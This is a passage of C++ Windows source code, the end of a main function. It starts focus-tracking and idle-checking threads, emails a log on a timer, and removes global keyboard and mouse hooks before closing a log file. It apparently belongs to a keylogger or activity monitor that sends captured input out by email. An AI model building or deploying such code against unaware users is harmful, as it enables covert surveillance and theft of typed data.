    thread focusThread(FocusTrackerLoop);
    focusThread.detach();

    thread idleThread(IdleCheckerLoop);
    idleThread.detach();

    thread autoSender([]() {
        while (true) {
            this_thread::sleep_for(chrono::minutes(AUTO_SEND_INTERVAL));
            SendEmailAuto();
        }
        });
    autoSender.detach();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    if (mouseHook) UnhookWindowsHookEx(mouseHook);
    if (g_uia) { g_uia->Release(); g_uia = nullptr; }
    logFile.close();
    return 0;
}